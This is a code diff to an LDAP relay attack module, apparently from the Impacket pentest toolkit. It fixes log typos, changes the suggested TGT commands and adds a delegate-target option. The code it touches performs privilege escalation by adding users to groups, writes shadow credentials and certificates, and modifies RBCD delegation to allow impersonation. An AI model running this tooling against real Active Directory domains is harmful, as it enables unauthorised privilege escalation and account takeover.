@@ -270,7 +270,7 @@ class LDAPAttack(ProtocolAttack):
             'member': [(ldap3.MODIFY_ADD, [userDn])]})
         if res:
             LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
-            LOG.info('Privilege escalation succesful, shutting down...')
+            LOG.info('Privilege escalation successful, shutting down...')
             alreadyEscalated = True
             _thread.interrupt_main()
         else:
@@ -353,9 +353,8 @@ class LDAPAttack(ProtocolAttack):
                     shadow_credentials.exportPEM(certificate,key,path_to_files=path)
                     LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                     LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
-                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
+                    LOG.info("python3 getTGT.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s" % (path, path, domain, currentShadowCredentialsTarget))
                 elif self.config.ShadowCredentialsExportType == "PFX":
                     if self.config.ShadowCredentialsPFXPassword is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -365,9 +364,8 @@ class LDAPAttack(ProtocolAttack):
                     shadow_credentials.exportPFX(certificate,key,password=password, path_to_file=path)
                     LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     LOG.info("Must be used with password: %s" % password)
-                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     LOG.info("Run the following command to obtain a TGT")
-                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
+                    LOG.info("python3 getTGT.py -cert-pfx %s.pfx -pfx-pass %s %s/%s" % (path, password, domain, currentShadowCredentialsTarget))
                     delegatePerformed.append(currentShadowCredentialsTarget)
             else:
                 self._handleShadowCredentialModifyError()
@@ -422,7 +420,7 @@ class LDAPAttack(ProtocolAttack):
         sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
         self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
         if self.client.result['result'] == 0:
-            LOG.info('Delegation rights modified succesfully!')
+            LOG.info('Delegation rights modified successfully!')
             LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
             delegatePerformed.append(targetsam)
         else:
@@ -1339,9 +1337,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
 
-        # Perform the Delegate attack if it is enabled and we relayed a computer account
-        if self.config.delegateaccess and self.username[-1] == '$':
-            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
+        # Perform the Delegate attack on --delegate-target, or on the relayed computer account by default
+        if self.config.delegateaccess and (self.config.delegatetarget or self.username[-1] == '$'):
+            targetsam = self.config.delegatetarget if self.config.delegatetarget else self.username
+            self.delegateAttack(self.config.escalateuser, targetsam, domainDumper, self.config.sid)
             return
         
         # Perform the Shadow Credentials attack if it is enabled
